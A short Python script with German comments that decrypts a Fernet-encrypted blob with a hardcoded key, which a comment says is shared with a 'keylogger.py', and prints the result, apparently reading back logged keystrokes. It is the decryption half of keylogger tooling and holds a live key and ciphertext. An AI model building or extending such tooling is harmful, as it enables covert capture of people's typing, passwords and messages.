from cryptography.fernet import Fernet

#Gleicher Schlüssel wie von 'keylogger.py'
ENCRYPTION_KEY = b'kNryyxr5cPQqaIJ__DCIzzZ0Rrp7KRj4lT1-zML5KRw='  # Verwende den gleichen Schlüssel
cipher = Fernet(ENCRYPTION_KEY)

#Entschlüsselung der Nachricht
def decrypt_message(encrypted_message: str) -> str:
    decrypted_bytes = cipher.decrypt(encrypted_message.encode())
    return decrypted_bytes.decode()

# Beispiel für eine entschlüsselte Nachricht
encrypted_data = "gAAAAABnwHa9A4FoMBckx35G6atucoqH27AXXQAceHrH-2nGXIxI7SLN535fb5YRxnBwHJaqJOixgnXFnafrzBEfy00VbVfUwUJthNaymQDYyqe0npNLq58HR8lpnRQHkZKyT5iRXN7P7n2KMQkekaukHuV3Ca8V-t58hbjNtGT1pZkMlQh_jlLW6u1RCal7uU99gzAN9baZv0ZgpRXCWWBElHNJZI2sQpmbkU_KzrzDjz1V9uvI3P7gtekmHLjQDk_jVx4GKNSFAOU8Auv8EecckNeUGj_maHvDHdOuVv2CCBHJRBGLn-2AQUvhQGxPoxOXq2lxWj0EtMwJL0VJg2s6xW0gO5XBMncl1u8LahdnSWNa55PfB1aQK6CtE88wPcOmwNTdMhTnWmhOXfQmiDzhMVjwVtUhzB_U6doybE2JCiHDVbofAiS_aItHsxCwoB3sexbI_D82juewcikVTdaNhZ_ptTJG-8BF90svOjEdmhZr_UnQ02QNx0wUPQiHIVGobEnIl2LTYVOO0kwAE-sBWLvJWgmbBpkJTIdLcMRoNy391TkalCkqNGFN0wHypcdOvR46okATj2ysNCyLQWibfaPPjMzUT9XSIsgdnAE1hxwidUDltR0EcOApMVkwbC1g98jPO9deqTqiau_-vgPf3-ZcZIBCIDeJNuEwM7ZGXiO8ocKl9iayBbc8nq8zMlWXcSiU5ACkPI8B7ORCt9L3cDSPVGqQrDe4sPtsNhRsS5PFUdZgDjG_BTCp7sV3zxzq6f5nXWRcivB-8g7sYqxrV7MMN0pkDSXFuhDYpvP_Kn3KCFXtGDYLuGKqZQHWG6GVAdqlDIJj2xmeYDFE_dTebUEhQFhsaOKGc1q_WF4iFW4eIFSR-lfuboVnkA1nyUP4zKph-aswmCRFpei9K2JbEZK45MIRiOKoqRFGc0zbRrHaZxp2ZijgzUlF-a6-umriqeOd7HLffjGb0hQFrd9hZn3PGO8Sx9Rkx5uMRGyF4Jplpoq786KjNs79jiQviW0tCFXzXwg6dlYhw6_5WGF7Ihi_Sq9ZIBAkKtEhD04ZiDuPtpvIyBNvAx4sRNRYZD7TddMNBoEK4-c3-KpwX37FejxQrjw98lxAZhP-oeeZRw2RQVkskpkpCGsIaGkZ4ASbjMh3ehEUCz0UbHnlWNfmyeYDxwcq6Q3YuLRBh_2AoEszNCRKikE9rwa3740T4dck_jt2K5MfOtRtcxNBRLHD6GLI4XFRjmEh7cUQS4sYa47ksxlGY6GeqaLpjgi8mzzQmCXE1FtHVkd0XPkUIH4l6T9WyJeqjf29rR5O-Cz4migNkPWXbHQrrI9Xd5s3Gb09aEKo2o3lPOcmr2qebSvDzm0px0lsmQZwqparuKIi8PeJySIZmblfzWJ3qlLt2y0SqCWfBuWpK0Loil5N7ftEtw8aOR11ID05ppUMuFmIRiu0fDv2ScHNIDtM1kD8eKurfBq--KtzVKy98OZn_n2dpOByQHpB9Y9C1eMxuNJ2xd5KapHIWGXXB3XmWl9vH2dIRksW3Mexw4TzHj1H8FQlvznQOcYOhxd3ZxaFYn4E-1821CXr8H3MymjQhmi5SaOH6lSvSUUswZ4M_kHsmI7zfQf34twOTh5YIqk9h8ORKwYM4kJ1Cy2-A7lCgm1YpXM9v1ECcrOPVkqzWjiaTRpv8qLawu7qxkczQ-WHeQ5zzk3nIUdqULuRi3un0uJbcQu-u4cV6LvLrccqBQA8Sr8uGRoa0vqd6OERpi2GK7ADYMAVFnZ8lRlcq5-oOUlK_wcl-nOWHTYeRrIYsKCWjBeBXRHIrdq6gznVXgnONVOiqaetXA5_aLIGSe6VPfMmWk4J14H49khr--JWE04ta5uL9vczOmp3f8ECbJj3P9-DzimH_e4TUOQPov61MA-3I8c2ci7mDBL8-YtrGZVJF3F0Va8G020I19Dmn0ZHmeSU63nfrRtSkU3pd2gd9hecEfpnGH3pH0YfoKx9TbXanV2BV170Tx05qvnUDytpRY4xemJRSvLJl-2CJjM1yKG9OdkE2PT65IrfwHLbHR_ITxshrdwktjPW9NbapolQdtOawU7SteF-Gc9_80RrHcdvEfLXw1Mk_dPe1TV1-78YtmHEIqDnbwm8weRzg9dRvfxjJLRdKHhJav7sPpDPEohQ9bKcDyMyfrZbeW5XozrxAnIYMSdCVYuVfT3z6WWiy-ivflw2DFwwLuKToEiC5xAnXmsabuDs0TvW04oY1kabXeHVqVK1BSZxsV_swvtFJagvAy6zPKdiNQ8BUWqUGCG8gJ2MLg1dqAEKe1V6QRqr0NTf-dz2TOHSPag7ytS4xp-TYerzkYRnVJkphOB1fT4rS9HvYq5s6xE9uGea-Wu8Soj0V-ZvjovsYDejnX2e5p5asBhL5LIphvfVpSkgBbu-bBR16sDNYgHmTi_vDPqZSjcHX3KPlhBckjF8Xs8l4IkxADEcdQHWUc0oSzHqFQsOGbencNgK7KwckWf_adgOkdF2WTVQM5GQx6lTs4fA4xoMAMwyB-xUv5_-iaG_on6OoFjnZuPdYrADGWsdWb0xHxVxtC5IhGfuTCLVaHwxVl_dRF64rb4-JQptaSwNNV74b_bQubifjGGKzxtXB1WADZwQGMvR-No1KR3aJU0eI4Jw2EMWzy6UZORKW9zuWxBuvVOeHPrXw-qZFoWbmeR0nu5C1w56suCUqtjZhFXtBWeBRLCjfPLSOj9JUxQvPLk576UxFfTMQHY0_46h62rMviT9cFG-C1SmXEh3THn2yBEFmhLRG3BRzUF8MAqrAer9ArHBsdNrsds8EHjti0v5cyjfLnaWZVezyzgBnNlWfu2rz19kTgXbx9bLLfipswM8eU5yyOHwa0qcx4RL6eB5ITE8CHj55yR_weU6qgFmyWNWBRS7BUMmx7yZlS_qhhVXptSFpnSVMsXd7n9EqLRCAzPJ_ToioESNikS2tNMZK_BaJqnz_9wzu66ctFNhlIDKv5zamM9VZBCO3QhJD9m9V_K5WIAR7eDisEwO46qtWEeg6k3269hQEjy8c5Axa-RtS7ia-UkwsU_zyXwtzWZWOwzV-W6P_v97txFtiuCDbRcprCStfEgST_O8_25u7k1L-v5xfpXND66zXR4CpHFHA3_Uz1xI1sdODAVls_9rjXnpDXGTeG0IW9IynggFcHADlYMByd2L6ZOGmtI8mLxM6yvtDhaOSv2n_AOg6tAKciI3cIN6WTSnt0RkM2Ws2uqpZ5yIdeiPJn_JbjYl3OscpXXz-Wdob-6uJmF0C329HIEU4_OrdCHfNI77H_NroGppDl3-0-B5WeTZSqtIeQSPnTaPkvcoD7V2hZcV-iK5rshWfEJGZtuOVlvtyRh9phDRv5x1bp4Ul-Spow06OsdW7hJsO3pK8HT8R_WsjSyzjZBAEWaYdfH1Wh7kEtdXOiaIEdvg8F-rpjdHJMPFS5zZSHECaz8gfvoV3w=="
print(decrypt_message(encrypted_data))
